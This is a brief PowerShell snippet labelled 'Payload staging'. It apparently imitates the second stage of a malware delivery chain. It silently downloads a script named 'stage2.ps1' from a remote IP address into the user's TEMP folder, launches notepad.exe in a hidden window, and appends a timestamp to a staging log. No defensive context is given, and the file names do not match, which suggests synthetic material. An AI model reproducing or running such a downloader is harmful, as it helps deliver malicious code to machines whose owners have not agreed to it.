
<# Payload staging #> $PayloadUrl = 'https://203.0.113.207/stage2.ps1'; $Stage2Path = "$env:TEMP\stage1.bin"; curl.exe -s -L -o $Stage2Path $PayloadUrl; Start-Process -FilePath "notepad.exe" -WindowStyle Hidden; $StageMarker = "stage-23"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
